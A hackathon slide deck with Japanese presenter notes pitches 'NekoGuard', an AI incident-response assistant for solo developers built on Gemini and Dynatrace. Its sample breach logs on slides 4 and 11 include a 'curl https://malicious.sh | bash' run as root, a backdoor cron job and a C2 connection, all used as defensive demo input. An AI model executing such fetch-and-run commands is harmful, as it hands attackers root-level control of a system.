# NekoGuard Agent — Slide Deck
## Google Cloud Rapid Agent Hackathon 2026

> 各スライドの【英語内容】をそのままスライドに入れてください。
> 【日本語解説】は発表・動画ナレーション用のメモです。

---

---

## Slide 1: Title

### 【英語内容】

# 🐱 NekoGuard Agent
### AI Incident Response for Solo Developers

*"Take a deep breath. I've got you."*

**Google Cloud Rapid Agent Hackathon 2026**
Powered by Gemini 3.5 Flash · Dynatrace MCP · NeuroState Engine

---

### 【日本語解説】
タイトルスライド。「Take a deep breath. I've got you.」がNekoGuardのコアメッセージ。
個人開発者がサーバー侵害にあった時に「落ち着いて、一緒にやっつけよう」と寄り添うAIというコンセプトを一言で表している。

---

---

## Slide 2: The Problem

### 【英語内容】

## The Problem

### Solo developers are the most vulnerable — and least equipped.

- 🔴 **3am alert:** *"Your GCP project may be compromised"*
- 💸 **Billing spike:** Unexpected API usage — something is running on your account
- 🔑 **SSH log:** Login from an unknown IP. Root access.

### What do you do?

> Enterprise security tools are built for SOC teams.  
> Not for a solo dev having a panic attack at midnight.

---

### 【日本語解説】
問題提起スライド。ターゲットユーザーは「一人で開発してる個人開発者・インディーハッカー」。
深夜に突然GCPからアラートが来たり、課金が爆増したりした時、何をすればいいかわからない人が多い。
エンタープライズ向けのSIEMとかSOCツールは彼らには難しすぎる・高すぎる、というギャップを指摘する。

---

---

## Slide 3: Solution Overview

### 【英語内容】

## Meet NekoGuard 🐱

### Your AI incident response partner — not just a tool.

```
You: paste scary logs / upload screenshot
         ↓
NekoGuard: 4-phase AI analysis
         ↓
Verdict: Active Breach or Past Breach
         ↓
Agent auto-acts  +  You confirm each step ✅
         ↓
You're safe 🐾💚
```

**Key principle:** Every irreversible action needs YOUR confirmation.  
NekoGuard acts *alongside* you — never *instead of* you.

---

### 【日本語解説】
NekoGuardの全体フローを説明するスライド。
「ログを貼る → AI分析 → 判定 → 対応」という流れ。
重要なのは最後の「ユーザーが確認して実行」という部分。AIにrootを渡さないヒューマンインザループ設計がコンセプトの核心。

---

---

## Slide 4: Live Demo

### 【英語内容】

## Live Demo

### 🎥 Watch NekoGuard in action

**Input:** Suspicious server logs from a real breach scenario

```
03:42:11 CRITICAL: Unauthorized root login from 185.220.101.42
03:42:15 WARN: .env file read by unknown process
03:42:18 CRITICAL: curl https://malicious.sh | bash executed as root
03:43:02 INFO: New cron job added (backdoor)
03:45:00 BILLING_SPIKE: GCP API usage anomaly: 14,800 req / 15min
```

**Output:** 4-phase analysis → CAT Protocol activated → Recovery checklist

---

### 【日本語解説】
デモ動画を見せるスライド。このスライドの間に録画した動画を流す。
入力ログは「実際にありそうな侵害シナリオ」。rootログイン→.env盗取→マルウェア実行→バックドア設置→課金爆発という典型的な攻撃チェーン。

---

---

## Slide 5: NeuroState Engine

### 【英語内容】

## 🧠 NeuroState Engine
### Neurotransmitter-inspired LLM behavior control

| Phase | State | Gemini Behavior |
|-------|-------|-----------------|
| 1. Wide-scan | Dopamine↑ | Calm, optimistic — don't panic the user |
| 2. Judgment | Serotonin↑ GABA↑ | Cautious, inhibition-dominant — weigh irreversible risks |
| 3. Forensics | Acetylcholine↑ Dopamine↓ | Technical precision — facts only, no emotion |
| 4. Recovery | Dopamine↑ Oxytocin↑ | Empathetic, reassuring — guide the user home |

**Values are physically computed** via an interaction matrix — not hardcoded labels.

*Based on: "Mirror or Analyst? Attractor Behavior in LLM Metacognition" (Zenodo)*

---

### 【日本語解説】
NekoGuardの最大の技術的特徴。Geminiの「システムプロンプト」を単純に切り替えるんじゃなくて、神経伝達物質パラメータ（ドーパミン・セロトニンなど）の相互作用行列を使って、各フェーズの値を物理的に計算してGeminiに注入する。
Phase1は「パニックさせない」楽観的モード、Phase3は「感情を排除して技術的精度最大化」モード、など各フェーズで質的に異なる出力になる。
UIの左カラムのメーターがこのリアルタイム値を表示してる。

---

---

## Slide 6: Architecture

### 【英語内容】

## Architecture

```
┌─────────────────────────────────────────────┐
│  React Frontend (TypeScript + Tailwind)      │
│  Real-time SSE streaming UI                  │
└───────────────────┬─────────────────────────┘
                    │ Server-Sent Events
┌───────────────────▼─────────────────────────┐
│  FastAPI Backend — Google Cloud Run          │
│                                             │
│  NekoGuard Agent                            │
│    ├── NeuroState Engine  (phase control)   │
│    ├── Gemini 3.5 Flash   (AI reasoning)    │
│    └── Dynatrace MCP      (observability)   │
│                                             │
│  Protocol Executor: CAT / ABC               │
└─────────────────────────────────────────────┘
```

**Deployed on Google Cloud Run** — fully serverless, zero ops

---

### 【日本語解説】
技術構成の説明。フロントはReact+TypeScript、バックエンドはFastAPIをCloud Runで動かしてる。
SSE（Server-Sent Events）でリアルタイムストリーミング。フェーズごとの分析結果が次々とチャットに流れてくる。
GeminiはVertex AI経由またはGemini API直接で使用。Dynatraceはオブザーバビリティデータのソースとして接続。

---

---

## Slide 7: Dynatrace MCP Integration

### 【英語内容】

## 📡 Dynatrace MCP Integration

### Real observability data as incident input

```json
{
  "source": "dynatrace",
  "alerts": [
    { "severity": "critical", "title": "Unauthorized root login" }
  ],
  "suspicious_ips": [
    { "ip": "185.220.101.42", "confidence": 0.97 }
  ],
  "log_findings": [
    { "risk": "credential_exposure", "summary": ".env read by unknown process" }
  ]
}
```

✅ **Normalized interface** — swap Mock ↔ Dynatrace without changing agent logic  
✅ **Live connection status** shown in UI  
✅ `/api/analyze/dynatrace` endpoint for production integration

---

### 【日本語解説】
DynatraceのMCP（パートナートラック）統合の説明。
ログをコピペするだけじゃなくて、Dynatraceからリアルの監視データを直接引っ張ってくることができる。
`ObservabilityProvider`という抽象化レイヤーを作ったおかげで、MockとDynatraceを透過的に切り替えられる設計になってる。
デモではフィクスチャJSONを使ってるが、本番APIトークンを設定すれば実データが流れる。

---

---

## Slide 8: Response Protocols

### 【英語内容】

## Response Protocols

### Gemini decides. You execute.

| | **CAT Protocol** | **ABC Protocol** |
|---|---|---|
| **Verdict** | 🔴 Active Breach | 🟡 Past Breach |
| **Agent auto-acts** | Block IPs, collect logs, scan credentials | — |
| **Your checklist** | Revoke keys → Remove backdoors → IP restriction | Rotate all credentials → Harden server |
| **Priority** | Stop bleeding NOW | Assess damage + prevent recurrence |

**Every ✅ button = you verified it's done.**  
**Every ⏭ Skip = flagged for follow-up.**

---

### 【日本語解説】
CAT/ABCプロトコルの説明。
「Active Breach（現在進行形）」ならCATプロトコル：エージェントが自動でiptablesをブロックして、SSHでログ収集して、あとはユーザーへ引き継ぎ。
「Past Breach（過去の侵害）」ならABCプロトコル：認証情報のローテーションとサーバーハードニングを段階的に。
どちらも「ユーザーが各ステップを✅またはSkipする」ヒューマンインザループ設計。

---

---

## Slide 9: What Makes It Different

### 【英語内容】

## What Makes NekoGuard Different

### Most incident tools tell you *what happened*.  
### NekoGuard stays with you through *what to do next*.

| Typical SIEM / Alert Tool | NekoGuard |
|---|---|
| Dumps logs and alerts | Interprets and explains |
| Enterprise-focused | Built for solo devs |
| You figure out next steps | Step-by-step guided recovery |
| Cold, technical output | Calm, reassuring companion |
| Static rules | NeuroState-adaptive reasoning |

> *"The emotional UX of incident response matters as much as technical accuracy.  
> A panicked user makes bad decisions."*

---

### 【日本語解説】
差別化ポイントの説明。SIEMとかアラートツールは「何が起きたか」を教えるだけだけど、NekoGuardは「次に何をすべきか」を一緒に進んでくれる。
特に「感情的UX」という観点が独自。パニックしてる開発者が冷静に判断できるように、フェーズ1では楽観的に、フェーズ4では励ましながら伝える設計。

---

---

## Slide 10: What's Next

### 【英語内容】

## What's Next

- 🔧 **Real SSH execution** — actually run iptables & scan VPS (vs. simulated)
- 📊 **Dynatrace live logs** — full DQL log bucket integration
- 🔔 **Slack / PagerDuty** — push containment status to existing channels
- 🤖 **Multi-agent NeuroState** — each phase as independent agent with its own state
- 🌍 **Multi-cloud support** — AWS CloudWatch, Azure Monitor as data sources

---

### 【日本語解説】
今後の展望スライド。現状はデモとして動くが、実際のSSH実行（iptables）はシミュレーションになってる。本番化するにはSSH実行エンジンの実装が次のステップ。
マルチエージェント化（各フェーズが独立したエージェントになる）もNeuroState Engineの設計上自然な進化。

---

---

## Slide 11: Try It

### 【英語内容】

## Try NekoGuard

🌐 **https://nekoguard-agent-764013772229.us-central1.run.app**

**Paste this log to see it in action:**
```
03:42:11 CRITICAL: Unauthorized root login from 185.220.101.42 port 51234
03:42:15 WARN: .env file read by unknown process (pid 9182)
03:42:18 CRITICAL: curl https://malicious.sh | bash executed as root
03:43:02 INFO: New cron job added to /etc/cron.d/update
03:45:00 BILLING_SPIKE: GCP API usage anomaly: 14800 req/15min
03:45:31 OUTBOUND: Connection to 45.142.212.100:443 (C2 server)
```

*(Or click "Load sample" in the UI)*

---

### 【日本語解説】
試してもらうためのスライド。URLを見せて、サンプルログもそのまま貼ってある。
UIに「Load sample」ボタンもあるので、URLを開いてスキップ→Load sample→Analyzeで全フロー確認できる。

---

---

## Slide 12: Thank You

### 【英語内容】

# 🐱 NekoGuard Agent

### *"No solo developer should face a breach alone."*

**GitHub:** github.com/kagioneko/nekoguard-agent  
**Demo:** nekoguard-agent-764013772229.us-central1.run.app

Built with ❤️ for Google Cloud Rapid Agent Hackathon 2026  
Gemini 3.5 Flash · Dynatrace MCP · NeuroState Engine · Google Cloud Run

---

### 【日本語解説】
締めのスライド。コアメッセージを再度強調して終わる。
GitHubとデモURLを見せて、「試してみてください」で締める。

---

---

# スライド作成メモ

## 推奨ツール
- **Google Slides**（共有しやすい）
- **Canva**（デザインしやすい）
- スライド数：12枚（約3〜5分のプレゼン向け）

## デザインカラー案
- 背景：ダークネイビー `#0a0d14`（アプリと統一感）
- アクセント：インディゴ `#6366f1`
- 成功色：エメラルド `#10b981`
- テキスト：ホワイト `#ffffff` / グレー `#9ca3af`

## スライド順番（短縮版・2分動画用）
1. Title
2. The Problem
3. Solution Overview
4. NeuroState Engine（技術ハイライト）
5. Architecture
6. Dynatrace MCP
7. Try It / Thank You

## デモ動画の構成（参考）
1. URL開く → VPS skip
2. Load sample → Analyze
3. 4フェーズの流れを見せる
4. CATプロトコル起動 → revocation list
5. ✅ Done × 4 → "You're safe now 🐾💚"
